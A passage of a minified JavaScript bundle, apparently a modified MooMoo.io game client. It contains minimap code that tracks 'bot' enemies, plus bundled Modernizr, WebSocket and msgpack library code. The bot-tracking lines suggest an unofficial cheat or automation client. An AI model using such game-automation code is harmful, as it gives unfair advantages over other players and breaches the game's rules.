          for (let LV = 0; LV < botEnemies.length; LV++) {
            if (botEnemies[LV] && botEnemies[LV][0] != yI.sid && !isAlly(botEnemies[LV][0]) && !botInfo.find(Ld => Ld[0] == botEnemies[LV][0])) {
              Vu.fillStyle = "#ff0000";
              TL(botEnemies[LV][1] / y7.mapScale * VA.width, botEnemies[LV][2] / y7.mapScale * VA.height, 7, Vu, !0);
            }
          }
        }
      }(yZ), -1 !== yC.id && Ji(yC.startX, yC.startY, yC.currentX, yC.currentY), -1 !== V0.id && Ji(V0.startX, V0.startY, V0.currentX, V0.currentY);
    }();
    if (V2 && V3 && document.getElementById("darkmode").checked) {
      let cf = VL.getTransform();
      let cA = VL.createRadialGradient(V2 / 2, V3 / 2, 100, V2 / 2, V3 / 2, 1e3);
      cA.addColorStop(0, "rgb(0, 0, 0, 0)"), cA.addColorStop(0.4, "rgb(0, 0, 0, 0.3)"), cA.addColorStop(1, "rgb(0, 0, 0, 0.6)");
      VL.fillStyle = cA;
      VL.fillRect(0, 0, V2, V3);
      VL.setTransform(cf);
    }
    requestAnimFrame(cS);
  }(), window.openLink = cK, window.aJoinReq = dX, window.follmoo = function () {
    yf || (yf = !0, yN("moofoll", 1));
  }, window.kickFromClan = dF, window.sendJoin = dZ, window.leaveAlliance = dO, window.createAlliance = dz, window.storeBuy = du, window.storeEquip = db, window.showItemInfo = dJ, window.selectSkinColor = function (cf) {
    V1 = cf, da();
  }, window.changeStoreIndex = function (cf) {
    dr != cf && (dr = cf, dR());
  }, window.config = y7;
}, function (y, V) {
  !function (d, J, T) {
    function L(N, X) {
      return typeof N === X;
    }
    var p = [], U = [], G = {_version: "3.5.0", _config: {classPrefix: "", enableClasses: !0, enableJSClass: !0, usePrefixes: !0}, _q: [], on: function (N, X) {
      var F = this;
      setTimeout(function () {
        X(F[N]);
      }, 0);
    }, addTest: function (N, X, F) {
      U.push({name: N, fn: X, options: F});
    }, addAsyncTest: function (N) {
      U.push({name: null, fn: N});
    }}, q = function () {};
    q.prototype = G, q = new q;
    var P = J.documentElement, g = "svg" === P.nodeName.toLowerCase();
    q.addTest("passiveeventlisteners", function () {
      var N = !1;
      try {
        var X = Object.defineProperty({}, "passive", {get: function () {
          N = !0;
        }});
        d.addEventListener("test", null, X);
      } catch (F) {}
      return N;
    }), function () {
      var N, X, F, Z, z, O;
      for (var E in U) if (U.hasOwnProperty(E)) {
        if (N = [], (X = U[E]).name && (N.push(X.name.toLowerCase()), X.options && X.options.aliases && X.options.aliases.length)) for (F = 0; F < X.options.aliases.length; F++) N.push(X.options.aliases[F].toLowerCase());
        for (Z = L(X.fn, "function") ? X.fn() : X.fn, z = 0; z < N.length; z++) 1 === (O = N[z].split(".")).length ? q[O[0]] = Z : (!q[O[0]] || q[O[0]] instanceof Boolean || (q[O[0]] = new Boolean(q[O[0]])), q[O[0]][O[1]] = Z), p.push((Z ? "" : "no-") + O.join("-"));
      }
    }(), function (N) {
      var X = P.className, F = q._config.classPrefix || "";
      if (g && (X = X.baseVal), q._config.enableJSClass) {
        var Z = new RegExp("(^|\\s)" + F + "no-js(\\s|$)");
        X = X.replace(Z, "$1" + F + "js$2");
      }
      q._config.enableClasses && (X += " " + F + N.join(" " + F), g ? P.className.baseVal = X : P.className = X);
    }(p), delete G.addTest, delete G.addAsyncTest;
    for (var H = 0; H < q._q.length; H++) q._q[H]();
    d.Modernizr = q;
  }(window, document);
}, function (y, V, d) {
  var J = d(24);
  d(19), y.exports = {socket: null, connected: !1, socketId: -1, connect: function (T, c, L) {
    if (!this.socket) {
      var p = this;
      try {
        var U = !1, G = T;
        this.socket = new WebSocket(G), this.socket.binaryType = "arraybuffer", this.socket.onmessage = function (q) {
          var P = new Uint8Array(q.data), g = J.decode(P), H = g[0];
          P = g[1], "io-init" == H ? p.socketId = P[0] : L[H].apply(void 0, P);
        }, this.socket.onopen = function () {
          p.connected = !0, c();
        }, this.socket.onclose = function (q) {
          p.connected = !1, 4001 == q.code ? c("Invalid Connection") : U || c("disconnected");
        }, this.socket.onerror = function (q) {
          this.socket && this.socket.readyState != WebSocket.OPEN && (U = !0, console.error("Socket error", arguments), c("Socket error"));
        };
      } catch (q) {
        console.warn("Socket connection error:", q), c(q);
      }
    }
  }, send: function (T) {
    var c = Array.prototype.slice.call(arguments, 1), L = J.encode([T, c]);
    this.socket.send(L);
  }, socketReady: function () {
    return this.socket && this.connected;
  }, close: function () {
    this.socket && this.socket.close();
  }};
}, function (y, V, d) {
  V.encode = d(9).encode, V.decode = d(15).decode, V.Encoder = d(37).Encoder, V.Decoder = d(38).Decoder, V.createCodec = d(39).createCodec, V.codec = d(40).codec;
}, function (y, V, d) {
  (function (J) {
    function T(c) {
      return c && c.isBuffer && c;
    }
    y.exports = T(void 0 !== J && J) || T(this.Buffer) || T("undefined" != typeof window && window.Buffer) || this.Buffer;
  }.call(this, d(11).Buffer));
}, function (y, V, d) {
  "use strict";
  V.byteLength = function (H) {
    var N = q(H), X = N[0], F = N[1];
    return 3 * (X + F) / 4 - F;
  }, V.toByteArray = function (H) {
    var N, X, F = q(H), Z = F[0], z = F[1], O = new L(function (M, K, w) {
      return 3 * (K + w) / 4 - w;
    }(0, Z, z)), E = 0, I = z > 0 ? Z - 4 : Z;
    for (X = 0; X < I; X += 4) N = T[H.charCodeAt(X)] << 18 | T[H.charCodeAt(X + 1)] << 12 | T[H.charCodeAt(X + 2)] << 6 | T[H.charCodeAt(X + 3)], O[E++] = N >> 16 & 255, O[E++] = N >> 8 & 255, O[E++] = 255 & N;
    return 2 === z && (N = T[H.charCodeAt(X)] << 2 | T[H.charCodeAt(X + 1)] >> 4, O[E++] = 255 & N), 1 === z && (N = T[H.charCodeAt(X)] << 10 | T[H.charCodeAt(X + 1)] << 4 | T[H.charCodeAt(X + 2)] >> 2, O[E++] = N >> 8 & 255, O[E++] = 255 & N), O;
  }, V.fromByteArray = function (H) {
    for (var N, X = H.length, F = X % 3, Z = [], z = 0, O = X - F; z < O; z += 16383) Z.push(g(H, z, z + 16383 > O ? O : z + 16383));
    return 1 === F ? (N = H[X - 1], Z.push(J[N >> 2] + J[N << 4 & 63] + "==")) : 2 === F && (N = (H[X - 2] << 8) + H[X - 1], Z.push(J[N >> 10] + J[N >> 4 & 63] + J[N << 2 & 63] + "=")), Z.join("");
  };
  for (var J = [], T = [], L = "undefined" != typeof Uint8Array ? Uint8Array : Array, p = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", U = 0, G = p.length; U < G; ++U) J[U] = p[U], T[p.charCodeAt(U)] = U;
  function q(H) {
    var N = H.length;
    if (N % 4 > 0) throw new Error("Invalid string. Length must be a multiple of 4");
    var X = H.indexOf("=");
    return -1 === X && (X = N), [X, X === N ? 0 : 4 - X % 4];
  }
  function P(H) {
    return J[H >> 18 & 63] + J[H >> 12 & 63] + J[H >> 6 & 63] + J[63 & H];
  }
  function g(H, N, X) {
    for (var F, Z = [], z = N; z < X; z += 3) F = (H[z] << 16 & 16711680) + (H[z + 1] << 8 & 65280) + (255 & H[z + 2]), Z.push(P(F));
    return Z.join("");
  }
  T["-".charCodeAt(0)] = 62, T["_".charCodeAt(0)] = 63;
}, function (y, V) {
  var d = {}.toString;
  y.exports = Array.isArray || function (J) {
    return "[object Array]" == d.call(J);
  };
}, function (y, V, d) {
  var J = d(0);
  function T(c) {
    return new Array(c);
  }
  (V = y.exports = T(0)).alloc = T, V.concat = J.concat, V.from = function (c) {
    if (!J.isBuffer(c) && J.isView(c)) c = J.Uint8Array.from(c); else if (J.isArrayBuffer(c)) c = new Uint8Array(c); else {
      if ("string" == typeof c) return J.from.call(V, c);
      if ("number" == typeof c) throw new TypeError('"value" argument must not be a number');
    }
    return Array.prototype.slice.call(c);
  };
}, function (y, V, d) {
  var J = d(0), T = J.global;
  function c(L) {
    return new T(L);
  }
  (V = y.exports = J.hasBuffer ? c(0) : []).alloc = J.hasBuffer && T.alloc || c, V.concat = J.concat, V.from = function (L) {
    if (!J.isBuffer(L) && J.isView(L)) L = J.Uint8Array.from(L); else if (J.isArrayBuffer(L)) L = new Uint8Array(L); else {
      if ("string" == typeof L) return J.from.call(V, L);
      if ("number" == typeof L) throw new TypeError('"value" argument must not be a number');
    }
    return T.from && 1 !== T.from.length ? T.from(L) : new T(L);
  };
}, function (y, V, d) {
  var J = d(0);
  function T(c) {
    return new Uint8Array(c);
  }
  (V = y.exports = J.hasArrayBuffer ? T(0) : []).alloc = T, V.concat = J.concat, V.from = function (c) {
    if (J.isView(c)) {
      var L = c.byteOffset, s = c.byteLength;
      (c = c.buffer).byteLength !== s && (c.slice ? c = c.slice(L, L + s) : (c = new Uint8Array(c)).byteLength !== s && (c = Array.prototype.slice.call(c, L, L + s)));
    } else {
      if ("string" == typeof c) return J.from.call(V, c);
      if ("number" == typeof c) throw new TypeError('"value" argument must not be a number');
    }
    return new Uint8Array(c);
  };
}, function (y, V) {
  V.copy = function (d, J, T, c) {
    var L;
    T || (T = 0), c || 0 === c || (c = this.length), J || (J = 0);
    var p = c - T;
    if (d === this && T < J && J < c) for (L = p - 1; L >= 0; L--) d[L + J] = this[L + T]; else for (L = 0; L < p; L++) d[L + J] = this[L + T];
    return p;
  }, V.toString = function (d, J, T) {
    var c = 0 | J;
    T || (T = this.length);
    for (var L = "", p = 0; c < T;) (p = this[c++]) < 128 ? L += String.fromCharCode(p) : (192 == (224 & p) ? p = (31 & p) << 6 | 63 & this[c++] : 224 == (240 & p) ? p = (15 & p) << 12 | (63 & this[c++]) << 6 | 63 & this[c++] : 240 == (248 & p) && (p = (7 & p) << 18 | (63 & this[c++]) << 12 | (63 & this[c++]) << 6 | 63 & this[c++]), p >= 65536 ? (p -= 65536, L += String.fromCharCode(55296 + (p >>> 10), 56320 + (1023 & p))) : L += String.fromCharCode(p));
    return L;
  }, V.write = function (d, J) {
    for (var T = J || (J |= 0), c = d.length, L = 0, p = 0; p < c;) (L = d.charCodeAt(p++)) < 128 ? this[T++] = L : L < 2048 ? (this[T++] = 192 | L >>> 6, this[T++] = 128 | 63 & L) : L < 55296 || L > 57343 ? (this[T++] = 224 | L >>> 12, this[T++] = 128 | L >>> 6 & 63, this[T++] = 128 | 63 & L) : (L = 65536 + (L - 55296 << 10 | d.charCodeAt(p++) - 56320), this[T++] = 240 | L >>> 18, this[T++] = 128 | L >>> 12 & 63, this[T++] = 128 | L >>> 6 & 63, this[T++] = 128 | 63 & L);
    return T - J;
  };
}, function (y, V, d) {
  V.setExtPackers = function (H) {
    H.addExtPacker(14, Error, [g, G]), H.addExtPacker(1, EvalError, [g, G]), H.addExtPacker(2, RangeError, [g, G]), H.addExtPacker(3, ReferenceError, [g, G]), H.addExtPacker(4, SyntaxError, [g, G]), H.addExtPacker(5, TypeError, [g, G]), H.addExtPacker(6, URIError, [g, G]), H.addExtPacker(10, RegExp, [P, G]), H.addExtPacker(11, Boolean, [q, G]), H.addExtPacker(12, String, [q, G]), H.addExtPacker(13, Date, [Number, G]), H.addExtPacker(15, Number, [q, G]), "undefined" != typeof Uint8Array && (H.addExtPacker(17, Int8Array, p), H.addExtPacker(18, Uint8Array, p), H.addExtPacker(19, Int16Array, p), H.addExtPacker(20, Uint16Array, p), H.addExtPacker(21, Int32Array, p), H.addExtPacker(22, Uint32Array, p), H.addExtPacker(23, Float32Array, p), "undefined" != typeof Float64Array && H.addExtPacker(24, Float64Array, p), "undefined" != typeof Uint8ClampedArray && H.addExtPacker(25, Uint8ClampedArray, p), H.addExtPacker(26, ArrayBuffer, p), H.addExtPacker(29, DataView, p)), T.hasBuffer && H.addExtPacker(27, L, T.from);
  };
  var J, T = d(0), L = T.global, p = T.Uint8Array.from, U = {name: 1, message: 1, stack: 1, columnNumber: 1, fileName: 1, lineNumber: 1};
  function G(H) {
    return J || (J = d(9).encode), J(H);
  }
  function q(H) {
    return H.valueOf();
  }
  function P(H) {
    (H = RegExp.prototype.toString.call(H).split("/")).shift();
    var N = [H.pop()];
    return N.unshift(H.join("/")), N;
  }
  function g(H) {
    var N = {};
    for (var X in U) N[X] = H[X];
    return N;
  }
}, function (y, V, J) {
  var T = J(5), L = J(7), U = L.Uint64BE, G = L.Int64BE, q = J(0), P = J(6), g = J(34), H = J(13).uint8, N = J(3).ExtBuffer, X = "undefined" != typeof Uint8Array, F = "undefined" != typeof Map, Z = [];
  Z[1] = 212, Z[2] = 213, Z[4] = 214, Z[8] = 215, Z[16] = 216, V.getWriteType = function (z) {
    var O = g.getWriteToken(z), E = z && z.useraw, I = X && z && z.binarraybuffer, M = I ? q.isArrayBuffer : q.isBuffer, K = I ? function (Q, D) {
      Y(Q, new Uint8Array(D));
    } : Y, R = F && z && z.usemap ? function (Q, D) {
      if (!(D instanceof Map)) return x(Q, D);
      var W = D.size;
      O[W < 16 ? 128 + W : W <= 65535 ? 222 : 223](Q, W);
      var B = Q.codec.encode;
      D.forEach(function (j, C, y0) {
        B(Q, C), B(Q, j);
      });
    } : x;
    return {boolean: function (Q, D) {
      O[D ? 195 : 194](Q, D);
    }, function: A, number: function (Q, D) {
      var W = 0 | D;
      D === W ? O[-32 <= W && W <= 127 ? 255 & W : 0 <= W ? W <= 255 ? 204 : W <= 65535 ? 205 : 206 : -128 <= W ? 208 : -32768 <= W ? 209 : 210](Q, W) : O[203](Q, D);
    }, object: E ? function (Q, D) {
      if (M(D)) return function (W, B) {
        var j = B.length;
        O[j < 32 ? 160 + j : j <= 65535 ? 218 : 219](W, j), W.send(B);
      }(Q, D);
      S(Q, D);
    } : S, string: function (Q) {
      return function (D, W) {
        var B = W.length, j = 5 + 3 * B;
        D.offset = D.reserve(j);
        var C = D.buffer, y0 = Q(B), y1 = D.offset + y0;
        B = P.write.call(C, W, y1);
        var y2 = Q(B);
        if (y0 !== y2) {
          var y3 = y1 + y2 - y0, y4 = y1 + B;
          P.copy.call(C, C, y3, y1, y4);
        }
        O[1 === y2 ? 160 + B : y2 <= 3 ? 215 + y2 : 219](D, B), D.offset += B;
      };
    }(E ? function (Q) {
      return Q < 32 ? 1 : Q <= 65535 ? 3 : 5;
    } : function (Q) {
      return Q < 32 ? 1 : Q <= 255 ? 2 : Q <= 65535 ? 3 : 5;
    }), symbol: A, undefined: A};
    function S(Q, D) {
      if (null === D) return A(Q, D);
      if (M(D)) return K(Q, D);
      if (T(D)) return function (B, j) {
        var C = j.length;
        O[C < 16 ? 144 + C : C <= 65535 ? 220 : 221](B, C);
        for (var y0 = B.codec.encode, y1 = 0; y1 < C; y1++) y0(B, j[y1]);
      }(Q, D);
      if (U.isUint64BE(D)) return function (B, j) {
        O[207](B, j.toArray());
      }(Q, D);
      if (G.isInt64BE(D)) return function (B, j) {
        O[211](B, j.toArray());
      }(Q, D);
      var W = Q.codec.getExtPacker(D);
      if (W && (D = W(D)), D instanceof N) return function (B, j) {
        var C = j.buffer, y0 = C.length, y1 = Z[y0] || (y0 < 255 ? 199 : y0 <= 65535 ? 200 : 201);
        O[y1](B, y0), H[j.type](B), B.send(C);
      }(Q, D);
      R(Q, D);
    }
    function A(Q, D) {
      O[192](Q, D);
    }
    function Y(Q, D) {
      var W = D.length;
      O[W < 255 ? 196 : W <= 65535 ? 197 : 198](Q, W), Q.send(D);
    }
    function x(Q, D) {
      var W = Object.keys(D), B = W.length;
      O[B < 16 ? 128 + B : B <= 65535 ? 222 : 223](Q, B);
      var j = Q.codec.encode;
      W.forEach(function (C) {
        j(Q, C), j(Q, D[C]);
      });
    }
  };
}, function (V, J, T) {
  var L = T(4), U = T(7), G = U.Uint64BE, q = U.Int64BE, P = T(13).uint8, H = T(0), N = H.global, X = H.hasBuffer && "TYPED_ARRAY_SUPPORT" in N && !N.TYPED_ARRAY_SUPPORT, F = H.hasBuffer && N.prototype || {};
  function Z() {
    var A = P.slice();
    return A[196] = z(196), A[197] = O(197), A[198] = E(198), A[199] = z(199), A[200] = O(200), A[201] = E(201), A[202] = I(202, 4, F.writeFloatBE || R, !0), A[203] = I(203, 8, F.writeDoubleBE || S, !0), A[204] = z(204), A[205] = O(205), A[206] = E(206), A[207] = I(207, 8, M), A[208] = z(208), A[209] = O(209), A[210] = E(210), A[211] = I(211, 8, K), A[217] = z(217), A[218] = O(218), A[219] = E(219), A[220] = O(220), A[221] = E(221), A[222] = O(222), A[223] = E(223), A;
  }
  function z(A) {
    return function (Y, b) {
      var x = Y.reserve(2), Q = Y.buffer;
      Q[x++] = A, Q[x] = b;
    };
  }
  function O(A) {
    return function (Y, b) {
      var x = Y.reserve(3), Q = Y.buffer;
      Q[x++] = A, Q[x++] = b >>> 8, Q[x] = b;
    };
  }
  function E(A) {
    return function (Y, b) {
      var x = Y.reserve(5), Q = Y.buffer;
      Q[x++] = A, Q[x++] = b >>> 24, Q[x++] = b >>> 16, Q[x++] = b >>> 8, Q[x] = b;
    };
  }
  function I(A, Y, b, x) {
    return function (Q, D) {
      var W = Q.reserve(Y + 1);
      Q.buffer[W++] = A, b.call(Q.buffer, D, W, x);
    };
  }
  function M(A, Y) {
    new G(this, Y, A);
  }
  function K(A, Y) {
    new q(this, Y, A);
  }
  function R(A, Y) {
    L.write(this, A, Y, !1, 23, 4);
  }
  function S(A, Y) {
    L.write(this, A, Y, !1, 52, 8);
  }
  J.getWriteToken = function (A) {
    return A && A.uint8array ? function () {
      var Y = Z();
      return Y[202] = I(202, 4, R), Y[203] = I(203, 8, S), Y;
    }() : X || H.hasBuffer && A && A.safe ? function () {
      var Y = P.slice();
      return Y[196] = I(196, 1, N.prototype.writeUInt8), Y[197] = I(197, 2, N.prototype.writeUInt16BE), Y[198] = I(198, 4, N.prototype.writeUInt32BE), Y[199] = I(199, 1, N.prototype.writeUInt8), Y[200] = I(200, 2, N.prototype.writeUInt16BE), Y[201] = I(201, 4, N.prototype.writeUInt32BE), Y[202] = I(202, 4, N.prototype.writeFloatBE), Y[203] = I(203, 8, N.prototype.writeDoubleBE), Y[204] = I(204, 1, N.prototype.writeUInt8), Y[205] = I(205, 2, N.prototype.writeUInt16BE), Y[206] = I(206, 4, N.prototype.writeUInt32BE), Y[207] = I(207, 8, M), Y[208] = I(208, 1, N.prototype.writeInt8), Y[209] = I(209, 2, N.prototype.writeInt16BE), Y[210] = I(210, 4, N.prototype.writeInt32BE), Y[211] = I(211, 8, K), Y[217] = I(217, 1, N.prototype.writeUInt8), Y[218] = I(218, 2, N.prototype.writeUInt16BE), Y[219] = I(219, 4, N.prototype.writeUInt32BE), Y[220] = I(220, 2, N.prototype.writeUInt16BE), Y[221] = I(221, 4, N.prototype.writeUInt32BE), Y[222] = I(222, 2, N.prototype.writeUInt16BE), Y[223] = I(223, 4, N.prototype.writeUInt32BE), Y;
    }() : Z();
  };
}, function (y, V, d) {
  V.setExtUnpackers = function (H) {
    H.addExtUnpacker(14, [U, q(Error)]), H.addExtUnpacker(1, [U, q(EvalError)]), H.addExtUnpacker(2, [U, q(RangeError)]), H.addExtUnpacker(3, [U, q(ReferenceError)]), H.addExtUnpacker(4, [U, q(SyntaxError)]), H.addExtUnpacker(5, [U, q(TypeError)]), H.addExtUnpacker(6, [U, q(URIError)]), H.addExtUnpacker(10, [U, G]), H.addExtUnpacker(11, [U, P(Boolean)]), H.addExtUnpacker(12, [U, P(String)]), H.addExtUnpacker(13, [U, P(Date)]), H.addExtUnpacker(15, [U, P(Number)]), "undefined" != typeof Uint8Array && (H.addExtUnpacker(17, P(Int8Array)), H.addExtUnpacker(18, P(Uint8Array)), H.addExtUnpacker(19, [g, P(Int16Array)]), H.addExtUnpacker(20, [g, P(Uint16Array)]), H.addExtUnpacker(21, [g, P(Int32Array)]), H.addExtUnpacker(22, [g, P(Uint32Array)]), H.addExtUnpacker(23, [g, P(Float32Array)]), "undefined" != typeof Float64Array && H.addExtUnpacker(24, [g, P(Float64Array)]), "undefined" != typeof Uint8ClampedArray && H.addExtUnpacker(25, P(Uint8ClampedArray)), H.addExtUnpacker(26, g), H.addExtUnpacker(29, [g, P(DataView)])), T.hasBuffer && H.addExtUnpacker(27, P(L));
  };
  var J, T = d(0), L = T.global, p = {name: 1, message: 1, stack: 1, columnNumber: 1, fileName: 1, lineNumber: 1};
  function U(H) {
    return J || (J = d(15).decode), J(H);
  }
  function G(H) {
    return RegExp.apply(null, H);
  }
  function q(H) {
    return function (N) {
      var X = new H;
      for (var F in p) X[F] = N[F];
      return X;
    };
  }
  function P(H) {
    return function (N) {
      return new H(N);
    };
  }
  function g(H) {
    return new Uint8Array(H).buffer;
  }
}, function (y, V, d) {
  var J = d(17);
  function T(U) {
    var G, q = new Array(256);
    for (G = 0; G <= 127; G++) q[G] = c(G);
    for (G = 128; G <= 143; G++) q[G] = p(G - 128, U.map);
    for (G = 144; G <= 159; G++) q[G] = p(G - 144, U.array);
    for (G = 160; G <= 191; G++) q[G] = p(G - 160, U.str);
    for (q[192] = c(null), q[193] = null, q[194] = c(!1), q[195] = c(!0), q[196] = L(U.uint8, U.bin), q[197] = L(U.uint16, U.bin), q[198] = L(U.uint32, U.bin), q[199] = L(U.uint8, U.ext), q[200] = L(U.uint16, U.ext), q[201] = L(U.uint32, U.ext), q[202] = U.float32, q[203] = U.float64, q[204] = U.uint8, q[205] = U.uint16, q[206] = U.uint32, q[207] = U.uint64, q[208] = U.int8, q[209] = U.int16, q[210] = U.int32, q[211] = U.int64, q[212] = p(1, U.ext), q[213] = p(2, U.ext), q[214] = p(4, U.ext), q[215] = p(8, U.ext), q[216] = p(16, U.ext), q[217] = L(U.uint8, U.str), q[218] = L(U.uint16, U.str), q[219] = L(U.uint32, U.str), q[220] = L(U.uint16, U.array), q[221] = L(U.uint32, U.array), q[222] = L(U.uint16, U.map), q[223] = L(U.uint32, U.map), G = 224; G <= 255; G++) q[G] = c(G - 256);
    return q;
  }
  function c(U) {
    return function () {
      return U;
    };
  }
  function L(U, G) {
    return function (q) {
      var P = U(q);
      return G(q, P);
    };
  }
  function p(U, G) {
    return function (q) {
      return G(q, U);
    };
  }
  V.getReadToken = function (U) {
    var G = J.getReadFormat(U);
    return U && U.useraw ? function (q) {
      var P, g = T(q).slice();
      for (g[217] = g[196], g[218] = g[197], g[219] = g[198], P = 160; P <= 191; P++) g[P] = p(P - 160, q.bin);
      return g;
    }(G) : T(G);
  };
}, function (y, V, d) {
  V.Encoder = c;
  var J = d(18), T = d(10).EncodeBuffer;
  function c(L) {
    if (!(this instanceof c)) return new c(L);
    T.call(this, L);
  }
  c.prototype = new T, J.mixin(c.prototype), c.prototype.encode = function (L) {
    this.write(L), this.emit("data", this.read());
  }, c.prototype.end = function (L) {
    arguments.length && this.encode(L), this.flush(), this.emit("end");
  };
}, function (y, V, d) {
  V.Decoder = c;
  var J = d(18), T = d(16).DecodeBuffer;
  function c(L) {
    if (!(this instanceof c)) return new c(L);
    T.call(this, L);
  }
  c.prototype = new T, J.mixin(c.prototype), c.prototype.decode = function (L) {
    arguments.length && this.write(L), this.flush();
  }, c.prototype.push = function (L) {
    this.emit("data", L);
  }, c.prototype.end = function (L) {
    this.decode(L), this.emit("end");
  };
}, function (y, V, d) {
  d(8), d(2), V.createCodec = d(1).createCodec;
}, function (y, V, d) {
  d(8), d(2), V.codec = {preset: d(1).preset};
}, function (y, V) {
  var J, T, L = y.exports = {};
  function U() {
    throw new Error("setTimeout has not been defined");
  }
  function G() {
    throw new Error("clearTimeout has not been defined");
  }
  function q(E) {
    if (J === setTimeout) return setTimeout(E, 0);
    if ((J === U || !J) && setTimeout) return J = setTimeout, setTimeout(E, 0);
    try {
      return J(E, 0);
    } catch (I) {
      try {
        return J.call(null, E, 0);
      } catch (M) {
        return J.call(this, E, 0);
      }
    }
  }
  !function () {
    try {
      J = "function" == typeof setTimeout ? setTimeout : U;
    } catch (E) {
      J = U;
    }
    try {
      T = "function" == typeof clearTimeout ? clearTimeout : G;
    } catch (I) {
      T = G;
    }
  }();
  var P, H = [], N = !1, X = -1;
  function F() {
    N && P && (N = !1, P.length ? H = P.concat(H) : X = -1, H.length && Z());
  }
  function Z() {
    if (!N) {
      var E = q(F);
      N = !0;
      for (var I = H.length; I;) {
        for (P = H, H = []; ++X < I;) P && P[X].run();
        X = -1, I = H.length;
      }
      P = null, N = !1, function (M) {
        if (T === clearTimeout) return clearTimeout(M);
        if ((T === G || !T) && clearTimeout) return T = clearTimeout, clearTimeout(M);
        try {
          T(M);
        } catch (K) {
          try {
            return T.call(null, M);
          } catch (w) {
            return T.call(this, M);
          }
        }
      }(E);
    }
  }
  function z(E, I) {
    this.fun = E, this.array = I;
  }
  function O() {}
  L.nextTick = function (E) {
    var I = new Array(arguments.length - 1);
    if (arguments.length > 1) for (var M = 1; M < arguments.length; M++) I[M - 1] = arguments[M];
    H.push(new z(E, I)), 1 !== H.length || N || q(Z);
  }, z.prototype.run = function () {
    this.fun.apply(null, this.array);
  }, L.title = "browser", L.browser = !0, L.env = {}, L.argv = [], L.version = "", L.versions = {}, L.on = O, L.addListener = O, L.once = O, L.off = O, L.removeListener = O, L.removeAllListeners = O, L.emit = O, L.prependListener = O, L.prependOnceListener = O, L.listeners = function (E) {
    return [];
  }, L.binding = function (E) {
    throw new Error("process.binding is not supported");
  }, L.cwd = function () {
    return "/";
  }, L.chdir = function (E) {
    throw new Error("process.chdir is not supported");
  }, L.umask = function () {
    return 0;
  };
}, function (y, V) {
  var d = Math.abs, J = (Math.cos, Math.sin, Math.pow, Math.sqrt), T = (d = Math.abs, Math.atan2), c = Math.PI;
  y.exports.randInt = function (L, p) {
    return Math.floor(Math.random() * (p - L + 1)) + L;
  }, y.exports.randFloat = function (L, p) {
    return Math.random() * (p - L + 1) + L;
  }, y.exports.lerp = function (L, p, U) {
    return L + (p - L) * U;
  }, y.exports.decel = function (L, p) {
    return L > 0 ? L = Math.max(0, L - p) : L < 0 && (L = Math.min(0, L + p)), L;
  }, y.exports.getDistance = function (L, p, U, G) {
    return J((U -= L) * U + (G -= p) * G);
  }, y.exports.getDirection = function (L, p, U, G) {
    return T(p - G, L - U);
  }, y.exports.getAngleDist = function (L, p) {
    var U = d(p - L) % (2 * c);
    return U > c ? 2 * c - U : U;
  }, y.exports.isNumber = function (L) {
    return "number" == typeof L && !isNaN(L) && isFinite(L);
  }, y.exports.isString = function (L) {
    return L && "string" == typeof L;
  }, y.exports.kFormat = function (L) {
    return L > 999 ? (L / 1e3).toFixed(1) + "k" : L;
  }, y.exports.capitalizeFirst = function (L) {
    return L.charAt(0).toUpperCase() + L.slice(1);
  }, y.exports.fixTo = function (L, p) {
    return parseFloat(L.toFixed(p));
  }, y.exports.sortByPoints = function (L, p) {
    return parseFloat(p.points) - parseFloat(L.points);
  }, y.exports.lineInRect = function (L, U, G, q, P, H, N, X) {
    var F = P, Z = N;
    if (P > N && (F = N, Z = P), Z > G && (Z = G), F < L && (F = L), F > Z) return !1;
    var z = H, O = X, E = N - P;
    if (Math.abs(E) > 1e-7) {
      var I = (X - H) / E, M = H - I * P;
      z = I * F + M, O = I * Z + M;
    }
    if (z > O) {
      var K = O;
      O = z, z = K;
    }
    return O > q && (O = q), z < U && (z = U), !(z > O);
  }, y.exports.containsPoint = function (L, p, U) {
    var G = L.getBoundingClientRect(), q = G.left + window.scrollX, P = G.top + window.scrollY, g = G.width, H = G.height;
    return p > q && p < q + g && U > P && U < P + H;
  }, y.exports.mousifyTouchEvent = function (L) {
    var p = L.changedTouches[0];
    L.screenX = p.screenX, L.screenY = p.screenY, L.clientX = p.clientX, L.clientY = p.clientY, L.pageX = p.pageX, L.pageY = p.pageY;
  }, y.exports.hookTouchEvents = function (L, p) {
    var U = !p, G = !1;
    function q(P) {
      y.exports.mousifyTouchEvent(P), window.setUsingTouch(!0), U && (P.preventDefault(), P.stopPropagation()), G && (L.onclick && L.onclick(P), L.onmouseout && L.onmouseout(P), G = !1);
    }
    L.addEventListener("touchstart", y.exports.checkTrusted(function (P) {
      y.exports.mousifyTouchEvent(P), window.setUsingTouch(!0), U && (P.preventDefault(), P.stopPropagation()), L.onmouseover && L.onmouseover(P), G = !0;
    }), !1), L.addEventListener("touchmove", y.exports.checkTrusted(function (P) {
      y.exports.mousifyTouchEvent(P), window.setUsingTouch(!0), U && (P.preventDefault(), P.stopPropagation()), y.exports.containsPoint(L, P.pageX, P.pageY) ? G || (L.onmouseover && L.onmouseover(P), G = !0) : G && (L.onmouseout && L.onmouseout(P), G = !1);
    }), !1), L.addEventListener("touchend", y.exports.checkTrusted(q), !1), L.addEventListener("touchcancel", y.exports.checkTrusted(q), !1), L.addEventListener("touchleave", y.exports.checkTrusted(q), !1);
  }, y.exports.removeAllChildren = function (L) {
    for (; L.hasChildNodes();) L.removeChild(L.lastChild);
  }, y.exports.generateElement = function (L) {
    var p = document.createElement(L.tag || "div");
    function U(P, g) {
      L[P] && (p[g] = L[P]);
    }
    for (var G in U("text", "textContent"), U("html", "innerHTML"), U("class", "className"), L) {
      switch (G) {
        case "tag":
        case "text":
        case "html":
        case "class":
        case "style":
        case "hookTouch":
        case "parent":
        case "children":
          continue;
      }
      p[G] = L[G];
    }
    if (p.onclick && (p.onclick = y.exports.checkTrusted(p.onclick)), p.onmouseover && (p.onmouseover = y.exports.checkTrusted(p.onmouseover)), p.onmouseout && (p.onmouseout = y.exports.checkTrusted(p.onmouseout)), L.style && (p.style.cssText = L.style), L.hookTouch && y.exports.hookTouchEvents(p), L.parent && L.parent.appendChild(p), L.children) for (var q = 0; q < L.children.length; q++) p.appendChild(L.children[q]);
    return p;
  }, y.exports.eventIsTrusted = function (L) {
    return !L || "boolean" != typeof L.isTrusted || L.isTrusted;
  }, y.exports.checkTrusted = function (L) {
    return function (p) {
      p && p instanceof Event && y.exports.eventIsTrusted(p) && L(p);
    };
  }, y.exports.randomString = function (L) {
